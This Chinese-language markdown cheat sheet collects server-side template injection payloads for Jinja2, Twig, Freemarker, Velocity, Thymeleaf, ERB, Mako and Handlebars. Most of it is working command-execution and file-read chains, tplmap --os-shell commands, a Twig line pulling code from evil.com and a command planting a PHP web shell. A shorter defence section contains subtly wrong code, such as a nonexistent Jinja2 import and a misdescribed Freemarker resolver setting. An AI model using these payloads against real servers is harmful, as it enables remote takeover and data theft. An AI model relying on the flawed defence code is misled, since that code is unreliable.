# 🎨 模板注入（SSTI）全技巧

> **OWASP Top 10 2021 — A03: Injection（注入）**
> **SSTI（Server-Side Template Injection，服务端模板注入）** 是指攻击者通过向模板引擎注入恶意代码，在服务器端执行任意操作的攻击方式。
> 关联：[命令注入全技巧](11-command-injection.md) | [XSS全技巧](12-xss.md) | [反序列化注入全技巧](18-deserialization.md) | [XXE注入全技巧](16-xxe.md) | [SQL注入全技巧](09-sql-injection.md)

---

## 📖 一、SSTI 基础原理

### 1.1 什么是 SSTI？

Web 应用使用模板引擎（如 Jinja2、Twig、Freemarker、Velocity）渲染页面。当**用户输入被直接拼接到模板中**而非作为数据传递时，攻击者可以注入模板语法，实现**任意代码执行**。

**漏洞示例（Python/Flask + Jinja2）：**

```python
from flask import Flask, request, render_template_string

app = Flask(__name__)

@app.route('/hello')
def hello():
    name = request.args.get('name', 'world')
    # ❌ 危险：用户输入直接拼接到模板中
    template = f"<h1>Hello, {name}!</h1>"
    return render_template_string(template)
```

**正常请求：** `?name=World` → `<h1>Hello, World!</h1>`
**恶意请求：** `?name={{7*7}}` → `<h1>Hello, 49!</h1>` ✅ 模板被解析！

> 如果页面显示 `49`，则存在 SSTI 漏洞！

### 1.2 SSTI 与 XSS 的区别

| 对比项 | SSTI | XSS |
|:---|:---|:---|
| **执行位置** | ⚡ **服务器端**执行 | 🌐 **客户端**浏览器执行 |
| **危害级别** | 🔴 极高（可 RCE、读取服务器文件） | 🟡 中等（主要是客户端攻击） |
| **攻击目标** | 服务器和数据 | 用户浏览器 |
| **根本原因** | 用户输入被当做**模板代码**解析 | 用户输入被当做**HTML/JS**执行 |
| **影响范围** | 整个服务器 | 特定用户 |
| **检测方式** | `{{7*7}}` 返回 `49` | `<script>alert(1)</script>` 弹窗 |

### 1.3 常见模板引擎

| 模板引擎 | 语言 | 常用框架 | 注入语法 |
|:---|:---|:---|:---|
| **Jinja2** | Python | Flask, Django | `{{ }}` `{% %}` |
| **Twig** | PHP | Symfony, Laravel | `{{ }}` `{% %}` |
| **Freemarker** | Java | Spring MVC | `${ }` `<# >` `[# ]` |
| **Velocity** | Java | Spring 旧版 | `$` `#` |
| **Thymeleaf** | Java | Spring Boot | `${ }` `*{ }` `@{ }` |
| **Smarty** | PHP | CodeIgniter | `{$var}` `{literal}` |
| **Mako** | Python | Pyramid | `${ }` `%` |
| **ERB** | Ruby | Rails | `<%= %>` `<% %>` |
| **Handlebars** | JavaScript | Express | `{{ }}` `{{{ }}}` |
| **Pug/Jade** | JavaScript | Express | `#{}` `!{}` |
| **Nunjucks** | JavaScript | Express | `{{ }}` `{% %}` |
| **Blade** | PHP | Laravel | `{{ }}` `@php` |
| **Liquid** | Ruby | Shopify | `{{ }}` `{% %}` |
| **Chevron/Mustache** | 多语言 | 通用 | `{{ }}`（无逻辑，相对安全） |

### 1.4 SSTI 的危害

- **远程代码执行（RCE）** — 执行系统命令
- **文件读取** — 读取 `/etc/passwd`、配置文件、数据库密码
- **敏感信息泄露** — 读取环境变量、框架密钥
- **SSRF** — 利用模板引擎发起内网请求
- **拒绝服务** — 注入无限循环

---

## 🔍 二、SSTI 检测技巧

### 2.1 基础检测 Payload

```python
# 通用数学运算检测（最简单）
{{7*7}}        # 如果返回 49 → SSTI 存在
${7*7}         # Freemarker/Velocity
#{7*7}

# 字符串操作
{{"test"|upper}}   # Jinja2 → TEST
{{"test"|length}}  # Jinja2 → 4

# 布尔值
{{true}}       # → True
{{false}}      # → False

# 绕过 WAF 的检测方式
{{7*'7'}}      # Jinja2 → 7777777（字符串重复7次）
{{7*7}}        # 替换为 {{7*"7"}} 或 {{"7"*7}}
```

### 2.2 按模板引擎识别

```python
# === Jinja2 (Python) ===
{{7*7}}        → 49
{{7*'7'}}      → 7777777（字符串乘法）
{{config}}     → 显示 Flask 配置对象

# === Twig (PHP) ===
{{7*7}}        → 49
{{_self.env.registerUndefinedFilterCallback("exec")}}  # RCE
{{_self.env.getFilter("id")}}                          # 执行命令

# === Freemarker (Java) ===
${7*7}         → 49
<#assign ex="freemarker.template.utility.Execute"?new()> ${ex("id")}

# === Velocity (Java) ===
#set($x=7*7) $x  → 49
#set($e="exp")$e.getClass().forName('java.lang.Runtime').getMethod('getRuntime',null).invoke(null,null).exec('id')

# === Smarty (PHP) ===
{$id=system('id')}   → 执行系统命令

# === Thymeleaf (Java) ===
${7*7}                → 49
${T(java.lang.Runtime).getRuntime().exec('id')}

# === ERB (Ruby) ===
<%= 7*7 %>            → 49
<%= system("id") %>   → 执行命令

# === Mako (Python) ===
${7*7}                → 49
<% import os; os.system("id") %>

# === Handlebars (JS) ===
{{7*7}}               → 49
{{#with "s" as |string|}}{{#with "e"}}{{#with split as |conslist|}}{{this.pop}}{{this.push (lookup string.sub "constructor")}}{{this.pop}}{{#with string.split as |codelist|}}{{this.pop}}{{this.push "return require('child_process').execSync('id')"}}{{this.pop}}{{#each conslist}}{{#with (string.sub.apply 0 codelist)}}{{this}}}}{{/with}}{{/each}}{{/with}}{{/with}}{{/with}}{{/with}}
```

### 2.3 自动化检测工具

```bash
# tplmap - SSTI 检测与利用工具（类似 SQLMap 的 SSTI 版）
git clone https://github.com/epinna/tplmap.git
cd tplmap

# 基础检测
python tplmap.py -u "http://target.com/page?name=test"

# POST 请求
python tplmap.py -u "http://target.com/page" -d 'name=test'

# 指定引擎
python tplmap.py -u "http://target.com/page?name=test" --engine jinja2

# 获取 Shell
python tplmap.py -u "http://target.com/page?name=test" --os-shell

# 执行命令
python tplmap.py -u "http://target.com/page?name=test" --os-cmd="id"
```

---

## 🚀 三、各引擎进阶利用

### 3.1 Jinja2（Python）RCE

```python
# === 获取 Python 内置类链 ===

# 步骤1：查看可访问的对象
{{config}}              # 如果 config 可用
{{self}}                # 当前模板对象
{{''.__class__}}        # 字符串的类 → <class 'str'>
{{''.__class__.__mro__[1]}}  # object 类

# 步骤2：从 object 找到子类
{{''.__class__.__mro__[1].__subclasses__()}}
# 寻找可利用的类（如 <class 'os.wrap_close'>, <class 'subprocess.Popen'>）

# 步骤3：利用 os 模块
{{''.__class__.__mro__[1].__subclasses__()[X].__init__.__globals__['os']}}
# X = 找到 os._wrap_close 的索引

# 一键 RCE Payload
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
{{''.__class__.__mro__[1].__subclasses__()[X].__init__.__globals__['os'].popen('id').read()}}

# 如果 popen 被禁用
{{self.__init__.__globals__.__builtins__['__import__']('os').popen('id').read()}}

# 使用 eval
{{self.__init__.__globals__.__builtins__['eval']("__import__('os').popen('id').read()")}}

# 文件操作
{{config.__class__.__init__.__globals__['os'].popen('cat /etc/passwd').read()}}
{{''.__class__.__mro__[1].__subclasses__()[X].__init__.__globals__['builtins'].open('/etc/passwd').read()}}
```

**查找可利用子类的自动化脚本：**

```python
# 在服务器上查找子类索引
# 注入以下代码到模板中
{% for c in ''.__class__.__mro__[1].__subclasses__() %}
  {% if 'wrap_close' in c.__name__ %}
    {{ loop.index0 }}
  {% endif %}
{% endfor %}

# 更完整的方法 - 提取所有类名
{% for c in ''.__class__.__mro__[1].__subclasses__() %}
  {{ loop.index0 }}: {{ c.__name__ }}
{% endfor %}
```

**Jinja2 过滤器绕过：**

```python
# 使用 attr 过滤器
{{config|attr("__init__")|attr("__globals__")|attr("__getitem__")("os")|attr("popen")("id")|attr("read")()}}

# 使用 request 对象
{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
{{request.environ}}

# 使用 lipsum（Flask-Jinja2 自带）
{{lipsum.__globals__["os"].popen("id").read()}}
```

### 3.2 Twig（PHP）RCE

```php
// === Twig RCE 利用 ===

// 基础检测
{{7*7}} → 49

// 使用 _self 获取环境
{{_self.env.registerUndefinedFilterCallback("exec")}}
{{_self.env.getFilter("id")}}

// 使用 sprintf + system
{{sprintf("id")|system}}

// 直接使用 PHP 函数
{{system('id')}}

// 文件读取
{{file_get_contents('/etc/passwd')}}

// 获取敏感信息
{{_self.env.getCache()}}
{{dump(app)}}

// Twig 1.x RCE（更旧版本）
{{_self.env.setLoader(('file_get_contents','http://evil.com/evil.php?'))}}

// 写文件
{{system('echo PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7Pz4= | base64 -d > /var/www/html/shell.php')}}
```

### 3.3 Freemarker（Java）RCE

```java
// === Freemarker RCE 利用 ===

// 基础检测
${7*7} → 49

// 获取外部工具执行类
<#assign ex="freemarker.template.utility.Execute"?new()>
${ex("id")}

// 使用对象构造
${"freemarker.template.utility.Execute"?new()("id")}

// 读取文件
<#assign file="freemarker.template.utility.ObjectConstructor"?new()>
${file("java.io.FileInputStream","/etc/passwd")}

// 另一种方式 - 使用 Runtime.exec()
<#assign class=(""?"class")>
<#assign runtime=class.forName("java.lang.Runtime")>
${runtime.getMethod("getRuntime",null).invoke(null,null).exec("id")}

// Freemarker 2.3.17+ 的绕过
<#assign uri=object?api.class.getResource("/").toURI()>
<#assign input=uri?api.create("file:///etc/passwd").toURL().openConnection().getInputStream()>
${input?api.readAll()?trim}

// 绕过 Execute 被禁用的情况
${"freemarker.template.utility.ObjectConstructor"?new()("java.lang.ProcessBuilder","id").start()}
```

### 3.4 Velocity（Java）RCE

```java
// === Velocity RCE 利用 ===

// 基础检测
#set($x=7*7) $x → 49

// 方法1：使用 Runtime
#set($rt=Class.forName("java.lang.Runtime"))
#set($inst=$rt.getMethod("getRuntime").invoke(null))
$inst.exec("id")

// 方法2：使用 Tool
#set($e="exec")
$rt.getMethod($e).invoke($inst,"id")

// 方法3：完整链
#set($str=$inst.getClass().forName("java.lang.String"))
#set($ch=$str.valueOf([99,109,100]))
$inst.exec($ch)

// 方法4：使用 ProcessBuilder
#set($pb=$inst.getClass().forName("java.lang.ProcessBuilder").getConstructor([95.85,105,100]).newInstance(["id"]))
$pb.start()
```

### 3.5 Thymeleaf（Java/Spring）RCE

```java
// === Thymeleaf RCE 利用 ===

// 基础检测
${7*7} → 49

// 利用 SpringEL
${T(java.lang.Runtime).getRuntime().exec("id")}

// 文件读取
${T(java.nio.file.Files).readAllLines(T(java.nio.file.Paths).get("/etc/passwd"))}

// Spring 表达式注入
${#runtime.exec('id')}

// 获取环境变量
${#ctx.getEnvironment().getProperty("user.dir")}
${#ctx.getEnvironment().getProperty("java.class.path")}

// Thymeleaf 视图名称注入（常见漏洞点）
// 如果控制器返回的视图名称中包含用户输入
// @GetMapping("/doc/{path}")
// public String doc(@PathVariable String path) {
//     return "doc/" + path;  // ❌ 危险！
// }
// 访问 /doc/__$%7Bnew%20java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(%22id%22).getInputStream()).useDelimiter(%22\\A%22).next()%7D__::.x
```

### 3.6 ERB（Ruby）RCE

```ruby
# === ERB RCE 利用 ===

# 基础检测
<%= 7*7 %> → 49

# 执行系统命令
<%= system("id") %>
<%= %x(id) %>

# 文件读取
<%= File.read('/etc/passwd') %>

# 使用反引号
<%= `id` %>

# 利用 IO
<%= IO.popen("id").read() %>

# 利用开放类
<%= class << self; self; end.class_eval { system('id') } %>
```

### 3.7 Mako（Python）RCE

```python
# === Mako RCE 利用 ===

# 基础检测
${7*7} → 49

# 直接 RCE
<% import os; os.system("id") %>

# 获取上下文
${self.module.cache}
${self.import_}

# 使用 __import__
${__import__('os').system('id')}

# 文件读取
${open('/etc/passwd').read()}

# 利用 context
${context['os'].popen('id').read()}
```

---

## 🛡️ 四、防御方案

### 4.1 安全使用模板引擎

```python
# Python/Flask - ✅ 正确方式

from flask import Flask, request, render_template

app = Flask(__name__)

# ✅ 安全：用户输入作为数据传递给模板，不拼接到模板字符串中
@app.route('/hello')
def hello():
    name = request.args.get('name', 'world')
    return render_template('hello.html', name=name)
```

```html
<!-- hello.html - 模板文件 -->
<h1>Hello, {{ name }}!</h1>
<!-- ↑ name 作为数据传入，不会被当做模板代码解析 -->
```

### 4.2 使用安全的模板语法

```python
# ❌ 危险：拼接用户输入到模板
template = f"<h1>Hello, {user_input}!</h1>"
return render_template_string(template)

# ✅ 安全：用户输入作为参数
return render_template('page.html', input=user_input)

# ✅ 如果必须动态渲染，先对输入做转义
from flask import escape
safe_input = escape(user_input)  # HTML 转义
template = f"<h1>Hello, {safe_input}!</h1>"
return render_template_string(template)
```

### 4.3 沙箱逃逸防御

```python
# Jinja2 沙箱加固
from jinja2.sandbox import SandboxedEnvironment

# 使用沙箱环境（但仍可能被绕过）
env = SandboxedEnvironment()
template = env.from_string("{{ user_input }}")

# ✅ 更好的方式：禁用内置函数
from jinja2 import Environment
from jinja2.utils import Fatal

env = Environment()
env.globals.clear()          # 清空全局变量
env.builtins = ['range']     # 只保留需要的内置函数
```

### 4.4 各语言防御示例

```java
// Java/Freemarker - 配置受限环境
Configuration cfg = new Configuration(Configuration.VERSION_2_3_31);
cfg.setTemplateLoader(new FileTemplateLoader(new File("/templates")));

// 禁用危险指令
cfg.setAutoEscapingPolicy(Configuration.ENABLE_IF_SUPPORTED);
cfg.setNewBuiltinClassResolver(TemplateClassResolver.SAFER_RESOLVER);
// 或使用 TemplateClassResolver.DANGEROUS_RESOLVER 来完全禁止

// 不使用用户输入拼接模板名
Template temp = cfg.getTemplate("safe_name.ftl");  // ✅ 使用预定义模板
```

```php
// PHP/Twig - 安全配置
$loader = new \Twig\Loader\FilesystemLoader('/templates');
$twig = new \Twig\Environment($loader, [
    'autoescape' => true,         // ✅ 自动转义
    'strict_variables' => true,   // ✅ 严格变量
    'debug' => false,             // ✅ 关闭调试
]);

// 禁用危险函数（Twig 1.x）
$twig->registerUndefinedFunctionCallback(function($name) {
    return false;  // 不注册任何未定义函数
});
```

### 4.5 通用防御原则

| 措施 | 说明 |
|:---|:---|
| ✅ **模板文件化** | 使用预定义的模板文件，不动态拼接模板字符串 |
| ✅ **数据分离** | 用户输入只作为数据传入，不拼接到模板代码中 |
| ✅ **自动转义** | 开启模板引擎的自动 HTML 转义功能 |
| ✅ **沙箱环境** | 使用受限的模板执行环境 |
| ✅ **最小权限** | Web 服务用户最小权限运行 |
| ✅ **输入验证** | 限制用户输入的内容格式和长度 |
| ✅ **白名单方法** | 只允许模板使用安全的方法和过滤器 |
| ✅ **避免危险函数** | 禁用 `exec`、`system`、`popen` 等函数在模板中的使用 |

---

## 🎯 五、检测流程速查

### 5.1 手动测试步骤

```mermaid
graph TD
    A[找到输入点] --> B[注入 {{7*7}}]
    B --> C{返回 49？}
    C -->|是| D[Jinja2/Twig/Smarty可能性大]
    C -->|否| E[注入 ${7*7}]
    E --> F{返回 49？}
    F -->|是| G[Freemarker/Velocity/Thymeleaf]
    F -->|否| H[注入 {{7*'7'}}]
    H --> I{返回 7777777？}
    I -->|是| J[确认 Jinja2]
    I -->|否| K[尝试其他引擎语法]
    K --> L[使用 tplmap 自动识别]
    D --> M[选择对应引擎的 RCE Payload]
    G --> M
    J --> M
    L --> M
```

### 5.2 各引擎检测速查

| 引擎 | 检测 Payload | 预期结果 |
|:---|:---|:---|
| Jinja2 | `{{7*7}}` | 49 |
| Jinja2 | `{{7*'7'}}` | 7777777 |
| Twig | `{{7*7}}` | 49 |
| Smarty | `{$id=7*7}` | 49 |
| Freemarker | `${7*7}` | 49 |
| Velocity | `#set($x=7*7)$x` | 49 |
| Thymeleaf | `${7*7}` | 49 |
| ERB | `<%= 7*7 %>` | 49 |
| Mako | `${7*7}` | 49 |

### 5.3 测试 Checklist

- [ ] 所有用户输入回显的页面（搜索框、用户名、错误信息）
- [ ] 模板文件名/路径参数（视图名称注入）
- [ ] 邮件模板、通知模板
- [ ] 错误页面模板
- [ ] 用户自定义内容（博客、简介、签名）
- [ ] 通过 API 返回的 HTML 内容
- [ ] 语言/主题切换功能

### 5.4 推荐工具

| 工具                      | 用途                      |
| :---------------------- | :---------------------- |
| **tplmap**              | SSTI 自动检测与利用（类似 SQLMap） |
| **Burp Suite**          | 手动测试 + Intruder 模糊测试    |
| **nuclei**              | 模板化漏洞扫描（含 SSTI 模板）      |
| **tplmap + --os-shell** | 获取系统 Shell              |

---

## 🔗 关联文件

| 文件 | 关联说明 |
|:---|:---|
| [命令注入全技巧](11-command-injection.md) | SSTI RCE 后常配合命令注入利用 |
| [XSS全技巧](12-xss.md) | SSTI 与 XSS 的区别与联系 |
| [反序列化注入全技巧](18-deserialization.md) | Java 模板引擎常配合反序列化 |
| [SQL注入全技巧](09-sql-injection.md) | 同属 A03 Injection 大类 |
| [XXE注入全技巧](16-xxe.md) | Java 模板引擎中 XXE 常与 SSTI 结合 |

> **💡 核心原则**：SSTI 的本质是 **用户输入被当做模板代码执行**。防御的关键是 **永远不要将用户输入拼接到模板字符串中**，而是作为数据参数传入预定义的模板文件！
